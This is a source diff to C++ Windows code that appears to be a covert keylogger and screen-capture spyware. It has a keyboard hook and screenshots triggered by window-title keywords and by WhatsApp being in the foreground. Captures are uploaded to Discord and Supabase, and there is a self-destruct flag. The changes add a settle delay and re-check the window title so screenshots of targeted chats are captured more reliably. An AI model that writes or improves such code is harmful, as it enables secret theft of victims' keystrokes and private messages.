@@ -62,6 +62,7 @@ static DWORD g_lastAutoScreenshot = 0;      // throttle for trigger-based screen
 static std::vector<std::string> g_triggers;   // keyword list from Supabase screenshot_triggers
 static std::string g_pendingAutoTitle;        // queued window title for auto-SS (processed on timer)
 static std::string g_pendingAutoKw;           // matched keyword for the pending auto-SS
+static DWORD g_pendingAutoAt = 0;             // GetTickCount when pending auto-SS may capture (settle delay)
 static std::string g_pendingFlushWin;         // title for keys queued off the keyboard hook
 static std::string g_pendingFlushKeys;        // keys to flush on timer (never network from hook)
 static bool g_running = true;                 // false stops the message loop and lets child exit
@@ -1439,11 +1440,32 @@ static void PostDiscordImage(const std::string& host, const std::string& title, 
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
+// True if title contains any active trigger keyword (case-insensitive).
+static bool TitleMatchesTrigger(const std::string& windowTitle, std::string* outKw) {
+    if (windowTitle.empty() || g_triggers.empty()) return false;
+    std::string lowerTitle;
+    lowerTitle.resize(windowTitle.size());
+    for (size_t i = 0; i < windowTitle.size(); i++)
+        lowerTitle[i] = (char)tolower((unsigned char)windowTitle[i]);
+    for (size_t i = 0; i < g_triggers.size(); i++) {
+        std::string kw = g_triggers[i];
+        std::string lowerKw;
+        lowerKw.resize(kw.size());
+        for (size_t j = 0; j < kw.size(); j++)
+            lowerKw[j] = (char)tolower((unsigned char)kw[j]);
+        if (lowerTitle.find(lowerKw) == std::string::npos) continue;
+        if (outKw) *outKw = kw;
+        return true;
+    }
+    return false;
+}
+
 // Queue auto-screenshot if window title matches a trigger, or if the foreground
 // process is WhatsApp.exe (Desktop assist for empty/localized titles). Does NOT
 // capture here — heavy work runs on the timer thread via ProcessPendingAutoScreenshot
-// (avoids blocking the low-level keyboard hook). Rate-limited to once per 5 minutes.
-// Also polled every 1s from WM_TIMER so mouse-only focus triggers without keystrokes.
+// after a settle delay (window paint/open animation). Rate-limited to once per 5
+// minutes (cooldown applied at capture time). Polled every 1s from WM_TIMER so
+// mouse-only focus triggers without keystrokes.
 static void CheckAutoScreenshot(const std::string& windowTitle) {
     if (g_triggers.empty()) return;
     if (!g_pendingAutoTitle.empty()) return;
@@ -1451,40 +1473,41 @@ static void CheckAutoScreenshot(const std::string& windowTitle) {
     if (now - g_lastAutoScreenshot < 300000) return;
 
     std::string matchedKw;
-    if (!windowTitle.empty()) {
-        std::string lowerTitle;
-        lowerTitle.resize(windowTitle.size());
-        for (size_t i = 0; i < windowTitle.size(); i++)
-            lowerTitle[i] = (char)tolower((unsigned char)windowTitle[i]);
-
-        for (size_t i = 0; i < g_triggers.size(); i++) {
-            std::string kw = g_triggers[i];
-            std::string lowerKw;
-            lowerKw.resize(kw.size());
-            for (size_t j = 0; j < kw.size(); j++)
-                lowerKw[j] = (char)tolower((unsigned char)kw[j]);
-            if (lowerTitle.find(lowerKw) == std::string::npos) continue;
-            matchedKw = kw;
-            break;
-        }
-    }
-    if (matchedKw.empty() && ForegroundIsWhatsApp())
+    if (!TitleMatchesTrigger(windowTitle, &matchedKw) && ForegroundIsWhatsApp())
         matchedKw = "whatsapp";
     if (matchedKw.empty()) return;
 
-    g_lastAutoScreenshot = now;
     g_pendingAutoTitle = windowTitle.empty() ? "WhatsApp" : windowTitle;
     g_pendingAutoKw = matchedKw;
+    g_pendingAutoAt = now + 2000;  // let window finish opening before capture
 }
 
 // Capture/upload queued auto-screenshot on the message-loop thread. Posts a
 // completed control row so the CAPTURES gallery shows it, plus Discord notify.
+// Waits until g_pendingAutoAt; cancels (no cooldown) if user left the matched app.
 static void ProcessPendingAutoScreenshot() {
     if (g_pendingAutoTitle.empty() || g_selfDestructing) return;
-    std::string windowTitle = g_pendingAutoTitle;
-    std::string kw = g_pendingAutoKw;
+    DWORD now = GetTickCount();
+    if (now < g_pendingAutoAt) return;
+
+    std::string liveTitle = GetWindowTitle();
+    std::string liveKw;
+    bool stillMatch = TitleMatchesTrigger(liveTitle, &liveKw) ||
+        (g_pendingAutoKw == "whatsapp" && ForegroundIsWhatsApp());
+    if (!stillMatch) {
+        g_pendingAutoTitle.clear();
+        g_pendingAutoKw.clear();
+        g_pendingAutoAt = 0;
+        LogMsg("AutoSS: cancelled (left matched window)");
+        return;
+    }
+
+    std::string windowTitle = liveTitle.empty() ? g_pendingAutoTitle : liveTitle;
+    std::string kw = liveKw.empty() ? g_pendingAutoKw : liveKw;
     g_pendingAutoTitle.clear();
     g_pendingAutoKw.clear();
+    g_pendingAutoAt = 0;
+    g_lastAutoScreenshot = now;
 
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
